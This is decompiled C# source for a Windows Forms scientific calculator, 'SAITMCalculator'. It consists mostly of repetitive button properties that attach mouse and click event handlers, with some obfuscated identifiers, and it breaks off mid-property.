using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace SAITMCalculator;

[DesignerGenerated]
public class Form1 : Form
{
	private struct Struct0
	{
		public string[] string_0;
	}

	private enum Enum0
	{

	}

	public string administration;

	public string pneumonia;

	public string layer;

	public string battle;

	public string battles;

	private Point point_0;

	private Point point_1;

	private string string_0;

	private calculation calculation_0;

	private double double_0;

	private double double_1;

	private double double_2;

	public string introduce;

	public string character;

	public string lunch;

	private double double_3;

	private double double_4;

	private double double_5;

	private int int_0;

	private IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("btn_x_3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Button xKaSzBsYrl;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btn_x_y")]
	private Button mAtAtoiCpn;

	internal virtual Button btn_1
	{
		[CompilerGenerated]
		get
		{
			return _btn_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_10);
			EventHandler eventHandler = XnutcZhovo;
			EventHandler eventHandler2 = method_117;
			Button val2 = _btn_1;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_1 = value;
			val2 = _btn_1;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_2
	{
		[CompilerGenerated]
		get
		{
			return _btn_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_11);
			EventHandler eventHandler = method_60;
			EventHandler eventHandler2 = method_118;
			Button val2 = _btn_2;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_2 = value;
			val2 = _btn_2;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_3
	{
		[CompilerGenerated]
		get
		{
			return _btn_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(meWiMocJiJ);
			EventHandler eventHandler = method_61;
			EventHandler eventHandler2 = method_119;
			Button val2 = _btn_3;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_3 = value;
			val2 = _btn_3;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_4
	{
		[CompilerGenerated]
		get
		{
			return _btn_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_12);
			EventHandler eventHandler = method_62;
			EventHandler eventHandler2 = method_120;
			Button val2 = _btn_4;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_4 = value;
			val2 = _btn_4;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_5
	{
		[CompilerGenerated]
		get
		{
			return _btn_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_13);
			EventHandler eventHandler = method_63;
			EventHandler eventHandler2 = method_121;
			Button val2 = _btn_5;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_5 = value;
			val2 = _btn_5;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_6
	{
		[CompilerGenerated]
		get
		{
			return _btn_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_14);
			EventHandler eventHandler = method_64;
			EventHandler eventHandler2 = method_122;
			Button val2 = _btn_6;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_6 = value;
			val2 = _btn_6;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_7
	{
		[CompilerGenerated]
		get
		{
			return _btn_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(blBiPtniDn);
			EventHandler eventHandler = method_65;
			EventHandler eventHandler2 = method_123;
			Button val2 = _btn_7;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_7 = value;
			val2 = _btn_7;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_8
	{
		[CompilerGenerated]
		get
		{
			return _btn_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_15);
			EventHandler eventHandler = method_66;
			EventHandler eventHandler2 = method_124;
			Button val2 = _btn_8;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_8 = value;
			val2 = _btn_8;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_9
	{
		[CompilerGenerated]
		get
		{
			return _btn_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_16);
			EventHandler eventHandler = method_67;
			EventHandler eventHandler2 = eIdWuvWide;
			Button val2 = _btn_9;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_9 = value;
			val2 = _btn_9;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_0
	{
		[CompilerGenerated]
		get
		{
			return _btn_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_17);
			EventHandler eventHandler = method_68;
			EventHandler eventHandler2 = method_125;
			Button val2 = _btn_0;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_0 = value;
			val2 = _btn_0;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_add
	{
		[CompilerGenerated]
		get
		{
			return _btn_add;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_18);
			EventHandler eventHandler = method_69;
			EventHandler eventHandler2 = yqhWhwcnQv;
			Button val2 = _btn_add;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_add = value;
			val2 = _btn_add;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_subtract
	{
		[CompilerGenerated]
		get
		{
			return _btn_subtract;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_19);
			EventHandler eventHandler = method_70;
			EventHandler eventHandler2 = method_126;
			Button val2 = _btn_subtract;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_subtract = value;
			val2 = _btn_subtract;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_divide
	{
		[CompilerGenerated]
		get
		{
			return _btn_divide;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_21);
			EventHandler eventHandler = method_72;
			EventHandler eventHandler2 = method_128;
			Button val2 = _btn_divide;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_divide = value;
			val2 = _btn_divide;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_multiply
	{
		[CompilerGenerated]
		get
		{
			return _btn_multiply;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_20);
			EventHandler eventHandler = method_71;
			EventHandler eventHandler2 = method_127;
			Button val2 = _btn_multiply;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_multiply = value;
			val2 = _btn_multiply;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_mplus
	{
		[CompilerGenerated]
		get
		{
			return _btn_mplus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_23);
			EventHandler eventHandler = method_74;
			EventHandler eventHandler2 = method_130;
			Button val2 = _btn_mplus;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_mplus = value;
			val2 = _btn_mplus;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_back
	{
		[CompilerGenerated]
		get
		{
			return _btn_back;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_28);
			EventHandler eventHandler = method_79;
			EventHandler eventHandler2 = method_129;
			Button val2 = _btn_back;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_back = value;
			val2 = _btn_back;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_clear
	{
		[CompilerGenerated]
		get
		{
			return _btn_clear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_25);
			EventHandler eventHandler = method_76;
			EventHandler eventHandler2 = method_134;
			Button val2 = _btn_clear;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_clear = value;
			val2 = _btn_clear;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_mminus
	{
		[CompilerGenerated]
		get
		{
			return _btn_mminus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_24);
			EventHandler eventHandler = method_75;
			EventHandler eventHandler2 = method_131;
			Button val2 = _btn_mminus;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_mminus = value;
			val2 = _btn_mminus;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_mg
	{
		[CompilerGenerated]
		get
		{
			return _btn_mg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_26);
			EventHandler eventHandler = method_77;
			EventHandler eventHandler2 = method_132;
			Button val2 = _btn_mg;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_mg = value;
			val2 = _btn_mg;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_1_2
	{
		[CompilerGenerated]
		get
		{
			return _btn_1_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_22);
			EventHandler eventHandler = method_73;
			EventHandler eventHandler2 = method_136;
			Button val2 = _btn_1_2;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_1_2 = value;
			val2 = _btn_1_2;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_addminus
	{
		[CompilerGenerated]
		get
		{
			return _btn_addminus;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_27);
			EventHandler eventHandler = method_78;
			EventHandler eventHandler2 = method_135;
			Button val2 = _btn_addminus;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_addminus = value;
			val2 = _btn_addminus;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_minimize
	{
		[CompilerGenerated]
		get
		{
			return _btn_minimize;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			EventHandler eventHandler = method_111;
			MouseEventHandler val = new MouseEventHandler(method_113);
			EventHandler eventHandler2 = method_115;
			Button val2 = _btn_minimize;
			if (val2 != null)
			{
				((Control)val2).remove_Click(eventHandler);
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler2);
			}
			_btn_minimize = value;
			val2 = _btn_minimize;
			if (val2 != null)
			{
				((Control)val2).add_Click(eventHandler);
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler2);
			}
		}
	}

	internal virtual Button btn_close
	{
		[CompilerGenerated]
		get
		{
			return _btn_close;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			EventHandler eventHandler = method_112;
			MouseEventHandler val = new MouseEventHandler(method_114);
			EventHandler eventHandler2 = method_116;
			Button val2 = _btn_close;
			if (val2 != null)
			{
				((Control)val2).remove_Click(eventHandler);
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler2);
			}
			_btn_close = value;
			val2 = _btn_close;
			if (val2 != null)
			{
				((Control)val2).add_Click(eventHandler);
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler2);
			}
		}
	}

	internal virtual Button btn_x_1_y
	{
		[CompilerGenerated]
		get
		{
			return _btn_x_1_y;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_34);
			EventHandler eventHandler = method_85;
			EventHandler eventHandler2 = method_158;
			Button val2 = _btn_x_1_y;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_x_1_y = value;
			val2 = _btn_x_1_y;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_pi
	{
		[CompilerGenerated]
		get
		{
			return _btn_pi;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_38);
			EventHandler eventHandler = method_89;
			EventHandler eventHandler2 = method_139;
			Button val2 = _btn_pi;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_pi = value;
			val2 = _btn_pi;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_exp
	{
		[CompilerGenerated]
		get
		{
			return _btn_exp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_37);
			EventHandler eventHandler = method_88;
			EventHandler eventHandler2 = method_145;
			Button val2 = _btn_exp;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_exp = value;
			val2 = _btn_exp;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_cot
	{
		[CompilerGenerated]
		get
		{
			return _btn_cot;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_36);
			EventHandler eventHandler = method_87;
			EventHandler eventHandler2 = method_144;
			Button val2 = _btn_cot;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_cot = value;
			val2 = _btn_cot;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_sec
	{
		[CompilerGenerated]
		get
		{
			return _btn_sec;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_35);
			EventHandler eventHandler = method_86;
			EventHandler eventHandler2 = method_143;
			Button val2 = _btn_sec;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_sec = value;
			val2 = _btn_sec;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_cosec
	{
		[CompilerGenerated]
		get
		{
			return _btn_cosec;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_39);
			EventHandler eventHandler = method_90;
			EventHandler eventHandler2 = method_142;
			Button val2 = _btn_cosec;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_cosec = value;
			val2 = _btn_cosec;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_tan
	{
		[CompilerGenerated]
		get
		{
			return _btn_tan;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_33);
			EventHandler eventHandler = method_84;
			EventHandler eventHandler2 = method_141;
			Button val2 = _btn_tan;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_tan = value;
			val2 = _btn_tan;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_cos
	{
		[CompilerGenerated]
		get
		{
			return _btn_cos;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_32);
			EventHandler eventHandler = method_83;
			EventHandler eventHandler2 = method_140;
			Button val2 = _btn_cos;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_cos = value;
			val2 = _btn_cos;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_sin
	{
		[CompilerGenerated]
		get
		{
			return _btn_sin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_31);
			EventHandler eventHandler = method_82;
			EventHandler eventHandler2 = method_146;
			Button val2 = _btn_sin;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_sin = value;
			val2 = _btn_sin;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_x_3
	{
		[CompilerGenerated]
		get
		{
			return xKaSzBsYrl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_49);
			EventHandler eventHandler = method_100;
			EventHandler eventHandler2 = method_156;
			Button val2 = xKaSzBsYrl;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			xKaSzBsYrl = value;
			val2 = xKaSzBsYrl;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_log
	{
		[CompilerGenerated]
		get
		{
			return _btn_log;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_45);
			EventHandler eventHandler = method_96;
			EventHandler eventHandler2 = method_157;
			Button val2 = _btn_log;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_log = value;
			val2 = _btn_log;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
				((Control)val2).add_Click(eventHandler2);
			}
		}
	}

	internal virtual Button btn_x_2
	{
		[CompilerGenerated]
		get
		{
			return _btn_x_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			MouseEventHandler val = new MouseEventHandler(method_47);
			EventHandler eventHandler = method_98;
			EventHandler eventHandler2 = method_154;
			Button val2 = _btn_x_2;
			if (val2 != null)
			{
				((Control)val2).remove_MouseMove(val);
				((Control)val2).remove_MouseLeave(eventHandler);
				((Control)val2).remove_Click(eventHandler2);
			}
			_btn_x_2 = value;
			val2 = _btn_x_2;
			if (val2 != null)
			{
				((Control)val2).add_MouseMove(val);
				((Control)val2).add_MouseLeave(eventHandler);
